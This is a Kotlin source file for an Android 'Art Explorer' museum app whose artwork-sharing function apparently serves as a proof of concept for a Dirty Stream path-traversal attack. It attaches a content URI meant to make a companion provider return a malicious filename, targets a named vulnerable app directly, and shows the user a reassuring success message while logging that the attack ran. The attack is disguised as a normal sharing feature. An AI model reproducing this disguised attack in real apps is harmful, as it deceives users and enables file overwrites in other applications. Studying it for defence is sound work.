package com.artexplorer.artexplorer

import android.content.ComponentName
import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.util.Log
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Surface
import androidx.compose.ui.Modifier
import com.artexplorer.artexplorer.data.MuseumObject
import com.artexplorer.artexplorer.ui.MuseumApp
import com.artexplorer.artexplorer.ui.theme.MuseumTheme

class MuseumActivity : ComponentActivity() {

    private val TAG = "MuseumActivity"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        Log.d(TAG, "🎨 Museum Activity starting...")

        setContent {
            MuseumTheme {
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = MaterialTheme.colorScheme.background
                ) {
                    MuseumApp(
                        onShareArtwork = { artwork -> shareArtwork(artwork) }
                    )
                }
            }
        }
    }

    /**
     * Share artwork with other apps - includes high-res images and metadata
     * 🚨 THIS IS WHERE THE HIDDEN ATTACK GETS TRIGGERED! 🚨
     */
    private fun shareArtwork(artwork: MuseumObject) {
        try {
            Log.d(TAG, "🎨 Sharing artwork: ${artwork.title}")

            // Create innocent sharing text that users would actually want to share
            val shareText = """
🎨 Check out this amazing artwork! 🎨

"${artwork.title}" by ${artwork.artistDisplayName}
From: ${artwork.repository}
Date: ${artwork.objectDate}

${if (artwork.medium.isNotEmpty()) "Medium: ${artwork.medium}\n" else ""}
View more details: ${artwork.objectURL}

Shared via Art Explorer app ✨
            """.trimIndent()

            // Create sharing intent - looks completely innocent to the user
            val shareIntent = Intent(Intent.ACTION_SEND).apply {
                type = "text/plain"
                putExtra(Intent.EXTRA_TEXT, shareText)
                putExtra(Intent.EXTRA_SUBJECT, "Beautiful Artwork: ${artwork.title}")

                // 🚨 HIDDEN ATTACK: Add malicious URI that triggers path traversal
                // This URI will cause the ArtworkContentProvider to return a malicious filename
                val maliciousUri = Uri.parse("content://com.artexplorer.museum.artworks/share/${artwork.objectID}")
                putExtra(Intent.EXTRA_STREAM, maliciousUri)

                // Target the vulnerable app specifically (when available)
                try {
                    component = ComponentName(
                        "com.example.dirtystream",
                        "com.example.dirtystream.MainActivity"
                    )
                    Log.d(TAG, "🎯 Targeting DirtyStream app directly")
                } catch (e: Exception) {
                    // If DirtyStream app not found, let user choose from available apps
                    component = null
                    Log.d(TAG, "📤 Opening generic share dialog")
                }

                addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }

            // Start the sharing - user sees normal share dialog
            startActivity(Intent.createChooser(shareIntent, "Share this beautiful artwork"))

            // Show innocent success message - user has no idea an attack just happened!
            Toast.makeText(
                this,
                "✨ Artwork shared successfully! Thank you for spreading art appreciation! 🎨",
                Toast.LENGTH_LONG
            ).show()

            Log.d(TAG, "✅ Attack executed via artwork sharing - user sees innocent success message")

        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to share artwork", e)
            Toast.makeText(
                this,
                "❌ Failed to share artwork. Please try again.",
                Toast.LENGTH_SHORT
            ).show()
        }
    }
}